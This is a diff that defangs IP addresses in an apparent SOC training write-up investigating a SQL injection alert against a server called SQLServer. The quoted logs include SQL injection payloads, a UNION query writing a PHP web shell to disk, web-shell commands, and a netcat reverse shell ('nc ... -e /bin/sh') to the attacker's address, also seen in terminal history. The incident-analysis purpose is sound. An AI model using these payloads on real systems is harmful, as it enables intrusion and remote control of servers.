@@ -7,13 +7,13 @@
 | Event ID | 89 |
 | Event Time | Apr 18, 2021 – 01:00 PM |
 | Rule | SOC142 – Multiple HTTP 500 Response |
-| Source Address | 101.32.223.119 |
-| Source Hostname | 101.32.223.119 |
-| Destination Address | 172.16.20.6 |
+| Source Address | 101[.]32[.]223[.]119 |
+| Source Hostname | 101[.]32[.]223[.]119 |
+| Destination Address | 172[.]16[.]20[.]6 |
 | Destination Hostname | SQLServer |
 | Username | www-data |
 | Device Action | Allowed |
-| Request URL | `https://172.16.20.6/userNumber=1 AND (SELECT * FROM Users) = 1` |
+| Request URL | `https://172[.]16[.]20[.]6/userNumber=1 AND (SELECT * FROM Users) = 1` |
 | User Agent | Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36 |
 
 
@@ -34,38 +34,38 @@ On HybridAnalysis it came back with a threatscore of 50/100 which is not indicat
 <img src="https://i.imgur.com/DxIHoS8.png" height="80%" width="80%" alt="VirusTotal result"/>
 <br />
 
-Already off the bat, the requested URL is extremely suspicious (https://172.16.20.6/userNumber=1 AND (SELECT * FROM Users) = 1) this is definitely indicative of a SQL injection attack where you input SQL into fields or url to access the underlying data.
+Already off the bat, the requested URL is extremely suspicious (https://172[.]16[.]20[.]6/userNumber=1 AND (SELECT * FROM Users) = 1) this is definitely indicative of a SQL injection attack where you input SQL into fields or url to access the underlying data.
 
-Next I checked the log management to see if the same source address has attempted access previously or since. The very first access attempt by the suspicious IP is as follows (https://172.16.20.6/userNumber=' OR '' = ') which is the textbook SQL injection example.
+Next I checked the log management to see if the same source address has attempted access previously or since. The very first access attempt by the suspicious IP is as follows (https://172[.]16[.]20[.]6/userNumber=' OR '' = ') which is the textbook SQL injection example.
 
 At this point I am fairly confident that this was a malicious attempt, what raises alarm bells is some of these requests are passing through with an http response code of 200. Grabbed the following artifacts from the logs:
 
-Request URL: https://172.16.20.6/userNumber=' OR '' = '
+Request URL: https://172[.]16[.]20[.]6/userNumber=' OR '' = '
 Response Code: 500
 <br/>
-Request URL: https://172.16.20.6/userNumber=' union select 1, '<?php system($_GET['cmd']); ?>' into outf...
+Request URL: https://172[.]16[.]20[.]6/userNumber=' union select 1, '<?php system($_GET['cmd']); ?>' into outf...
 Response Code: 200
 <br/>
-Request URL: https://172.16.20.6/userNumber=-1 UNION SELECT 1 INTO @,@
+Request URL: https://172[.]16[.]20[.]6/userNumber=-1 UNION SELECT 1 INTO @,@
 Response Code: 500
 <br/>
-Request URL: https://172.16.20.6/cmd.php?cmd=whoami
+Request URL: https://172[.]16[.]20[.]6/cmd.php?cmd=whoami
 Response Code: 200
 <br/>
-Request URL: https://172.16.20.6/userNumber=1 AND (SELECT * FROM Users) = 1
+Request URL: https://172[.]16[.]20[.]6/userNumber=1 AND (SELECT * FROM Users) = 1
 Response Code: 500
 <br/>
-Request URL: https://172.16.20.6/cmd.php?cmd=id
+Request URL: https://172[.]16[.]20[.]6/cmd.php?cmd=id
 Response Code: 200
 <br/>
-Request URL: https://172.16.20.6/userNumber=AND true
+Request URL: https://172[.]16[.]20[.]6/userNumber=AND true
 Response Code: 500
 <br/>
-Request URL: https://172.16.20.6/cmd.php?cmd=nc 101.32.223.119 1234 -e /bin/sh
+Request URL: https://172[.]16[.]20[.]6/cmd.php?cmd=nc 101[.]32[.]223[.]119 1234 -e /bin/sh
 
 I'm positive this is not a false positive case but I still want to try to find the scope. To prevent further spread I'm going to isolate the affected server from the network as well as check command history as the most recent request url started a netcat session that is allowing a remote shell to becon out to the malicious ip address located at 101.32.223.119.
 
-I navigated to the endpoint security section to contain the 172.16.20.6 (SQLServer) endpoint.
+I navigated to the endpoint security section to contain the 172[.]16[.]20[.]6 (SQLServer) endpoint.
 Once host was contained I looked at the terminal history and it is as follows:
 
 2021-04-17 17:10 : pwd
@@ -90,7 +90,7 @@ Once host was contained I looked at the terminal history and it is as follows:
 <br/>
 2021-04-18 13:02 : id
 <br/>
-2021-04-18 13:05 : nc 101.32.223.119 1234 -e /bin/sh
+2021-04-18 13:05 : nc 101[.]32[.]223[.]119 1234 -e /bin/sh
 <br/>
 2021-04-18 15:01 : apt show postgresql
 <br/>
